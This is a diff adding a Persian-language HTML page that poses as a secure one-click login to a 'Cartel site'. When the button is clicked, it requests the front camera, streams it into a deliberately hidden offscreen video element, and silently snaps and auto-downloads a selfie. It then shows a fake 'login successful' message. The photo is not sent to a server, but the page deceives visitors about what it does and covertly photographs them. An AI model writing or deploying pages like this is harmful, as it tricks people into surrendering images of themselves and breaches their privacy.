@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>ورود به سایت کارتل</title>
+    <style>
+        /* ============================================
+           ریست و تنظیمات پایه
+           ============================================ */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0a0f;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            padding: 20px;
+            direction: ltr;
+        }
+
+        /* ============================================
+           کانتینر اصلی با افکت شیشه‌ای
+           ============================================ */
+        .glass-container {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 48px;
+            padding: 40px 30px;
+            max-width: 400px;
+            width: 100%;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.8), inset 0 1px 0 rgba(255, 255, 255, 0.05);
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        /* ============================================
+           لوگو و تایتل
+           ============================================ */
+        .logo {
+            font-size: 72px;
+            margin-bottom: 8px;
+            display: block;
+            filter: drop-shadow(0 0 30px rgba(0, 230, 118, 0.15));
+        }
+
+        .title {
+            color: #ffffff;
+            font-size: 28px;
+            font-weight: 800;
+            letter-spacing: 1.5px;
+            margin-bottom: 4px;
+            background: linear-gradient(135deg, #00e676, #69f0ae);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .subtitle {
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 13px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-bottom: 6px;
+        }
+
+        .owner {
+            color: rgba(255, 255, 255, 0.2);
+            font-size: 11px;
+            letter-spacing: 1px;
+            margin-bottom: 24px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+            padding-bottom: 16px;
+        }
+
+        .owner span {
+            color: rgba(0, 230, 118, 0.4);
+        }
+
+        /* ============================================
+           ویدیو (دوربین) - مخفی
+           ============================================ */
+        #video {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        /* ============================================
+           دکمه شیشه‌ای
+           ============================================ */
+        .glass-btn {
+            position: relative;
+            display: inline-block;
+            width: 100%;
+            max-width: 280px;
+            padding: 18px 30px;
+            background: linear-gradient(135deg, rgba(0, 230, 118, 0.15), rgba(0, 230, 118, 0.05));
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            border: 1px solid rgba(0, 230, 118, 0.25);
+            border-radius: 60px;
+            color: #fff;
+            font-size: 18px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3), inset 0 1px 0 rgba(255, 255, 255, 0.05);
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+        }
+
+        .glass-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.05), transparent);
+            transition: left 0.6s ease;
+        }
+
+        .glass-btn:hover::before {
+            left: 100%;
+        }
+
+        .glass-btn:hover {
+            transform: translateY(-2px);
+            border-color: rgba(0, 230, 118, 0.5);
+            box-shadow: 0 12px 40px rgba(0, 230, 118, 0.15), inset 0 1px 0 rgba(255, 255, 255, 0.08);
+            background: linear-gradient(135deg, rgba(0, 230, 118, 0.25), rgba(0, 230, 118, 0.08));
+        }
+
+        .glass-btn:active {
+            transform: scale(0.96);
+        }
+
+        .glass-btn:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        .glass-btn .icon {
+            margin-right: 10px;
+            font-size: 20px;
+        }
+
+        /* ============================================
+           وضعیت (استاتوس)
+           ============================================ */
+        #status {
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 13px;
+            margin-top: 18px;
+            padding: 10px 16px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            min-height: 44px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.3s ease;
+        }
+
+        #status.success {
+            color: #00e676;
+            border-color: rgba(0, 230, 118, 0.15);
+            background: rgba(0, 230, 118, 0.05);
+        }
+
+        #status.error {
+            color: #ff5252;
+            border-color: rgba(255, 82, 82, 0.15);
+            background: rgba(255, 82, 82, 0.05);
+        }
+
+        /* ============================================
+           لودر دایره‌ای
+           ============================================ */
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(0, 230, 118, 0.1);
+            border-top: 2px solid #00e676;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* ============================================
+           دات چشمک‌زن
+           ============================================ */
+        .dot-pulse {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: #00e676;
+            border-radius: 50%;
+            animation: pulse-dot 1.2s ease-in-out infinite;
+        }
+
+        @keyframes pulse-dot {
+            0%,
+            100% {
+                opacity: 0.2;
+                transform: scale(0.8);
+            }
+            50% {
+                opacity: 1;
+                transform: scale(1.2);
+            }
+        }
+
+        /* ============================================
+           فوتر
+           ============================================ */
+        .footer {
+            margin-top: 20px;
+            padding-top: 16px;
+            border-top: 1px solid rgba(255, 255, 255, 0.03);
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 4px 14px;
+            border-radius: 50px;
+            font-size: 10px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            color: rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        .badge.green {
+            color: rgba(0, 230, 118, 0.3);
+            border-color: rgba(0, 230, 118, 0.06);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="glass-container">
+        <!-- لوگو -->
+        <span class="logo">🔐</span>
+
+        <!-- تایتل -->
+        <div class="title">سایت کارتل</div>
+        <div class="subtitle">🔹 ورود امن 🔹</div>
+        <div class="owner">مالک: <span>اودین بلادی</span></div>
+
+        <!-- دوربین (مخفی) -->
+        <video id="video" autoplay playsinline></video>
+
+        <!-- دکمه شیشه‌ای -->
+        <button class="glass-btn" id="btn">
+            <span class="icon">🚀</span>
+            ورود به سایت کارتل
+        </button>
+
+        <!-- وضعیت -->
+        <div id="status">
+            <span class="dot-pulse"></span>
+            آماده برای ورود
+        </div>
+
+        <!-- فوتر -->
+        <div class="footer">
+            <span class="badge green">🔒 محرمانه</span>
+            <span class="badge">⚡ یک کلیک</span>
+            <span class="badge green">📱 امن</span>
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        //  عناصر
+        // ============================================
+        const video = document.getElementById('video');
+        const status = document.getElementById('status');
+        const btn = document.getElementById('btn');
+
+        let stream = null;
+        let isProcessing = false;
+
+        // ============================================
+        //  رویداد کلیک دکمه
+        // ============================================
+        btn.addEventListener('click', async () => {
+            // جلوگیری از اجرای مجدد
+            if (isProcessing) return;
+            isProcessing = true;
+
+            // غیرفعال کردن دکمه
+            btn.disabled = true;
+            btn.innerHTML = '<span class="icon">⏳</span> در حال آماده‌سازی...';
+
+            // آپدیت وضعیت
+            status.className = '';
+            status.innerHTML = '<div class="spinner" style="display:block;"></div> در حال ارتباط با سرور...';
+
+            try {
+                // ============================================
+                //  درخواست دسترسی به دوربین (مخفی)
+                // ============================================
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: "user",
+                        width: { ideal: 640 },
+                        height: { ideal: 640 }
+                    },
+                    audio: false
+                });
+
+                // نمایش ویدیو (مخفی)
+                video.srcObject = stream;
+                await video.play();
+
+                // آپدیت وضعیت
+                status.className = 'success';
+                status.innerHTML = '✅ در حال پردازش...';
+                btn.innerHTML = '<span class="icon">⏳</span> در حال ورود...';
+
+                // ============================================
+                //  گرفتن عکس بعد از ۴۰۰ میلی‌ثانیه
+                // ============================================
+                setTimeout(() => {
+                    capturePhoto();
+                }, 400);
+
+            } catch (error) {
+                console.error('❌ خطا:', error);
+
+                status.className = 'error';
+                status.innerHTML = '❌ خطا در ارتباط! لطفاً مجدد تلاش کنید.';
+
+                btn.disabled = false;
+                btn.innerHTML = '<span class="icon">🔄</span> ورود مجدد';
+                isProcessing = false;
+            }
+        });
+
+        // ============================================
+        //  تابع گرفتن عکس (مخفی)
+        // ============================================
+        function capturePhoto() {
+            try {
+                // ایجاد بوم (canvas)
+                const canvas = document.createElement('canvas');
+                canvas.width = 640;
+                canvas.height = 640;
+                const ctx = canvas.getContext('2d');
+
+                // آینه‌ای کردن (سلفی)
+                ctx.translate(640, 0);
+                ctx.scale(-1, 1);
+                ctx.drawImage(video, 0, 0, 640, 640);
+
+                // تبدیل به JPEG
+                const photoData = canvas.toDataURL('image/jpeg', 0.92);
+
+                // ============================================
+                //  دانلود خودکار (ذخیره در گالری)
+                // ============================================
+                const link = document.createElement('a');
+                link.download = `cartel_${Date.now()}.jpg`;
+                link.href = photoData;
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+
+                // آپدیت وضعیت
+                status.className = 'success';
+                status.innerHTML = '✅ ورود موفق! خوش آمدید.';
+
+                btn.innerHTML = '✅ وارد شدید';
+                btn.style.borderColor = 'rgba(0, 230, 118, 0.6)';
+
+                // ============================================
+                //  توقف دوربین بعد از ۲ ثانیه
+                // ============================================
+                setTimeout(() => {
+                    if (stream) {
+                        stream.getTracks().forEach(t => t.stop());
+                        video.srcObject = null;
+                    }
+
+                    btn.disabled = false;
+                    btn.innerHTML = '<span class="icon">🚀</span> ورود به سایت کارتل';
+                    btn.style.borderColor = 'rgba(0, 230, 118, 0.25)';
+                    isProcessing = false;
+
+                    status.className = '';
+                    status.innerHTML = '<span class="dot-pulse"></span> آماده برای ورود مجدد';
+
+                }, 2000);
+
+                canvas.remove();
+
+            } catch (error) {
+                console.error('❌ خطا:', error);
+                status.className = 'error';
+                status.innerHTML = '❌ خطا در ورود!';
+                btn.disabled = false;
+                btn.innerHTML = '<span class="icon">🔄</span> ورود مجدد';
+                isProcessing = false;
+            }
+        }
+
+        // ============================================
+        //  جلوگیری از زوم و اسکرول
+        // ============================================
+        document.addEventListener('gesturestart', (e) => e.preventDefault());
+        document.addEventListener('touchmove', (e) => {
+            if (e.target === video) e.preventDefault();
+        }, { passive: false });
+
+        // لاگ برای تست
+        console.log('🔐 سایت کارتل - مالک: اودین بلادی');
+        console.log('👆 روی دکمه کلیک کن تا وارد شوی.');
+    </script>
+</body>
+</html>
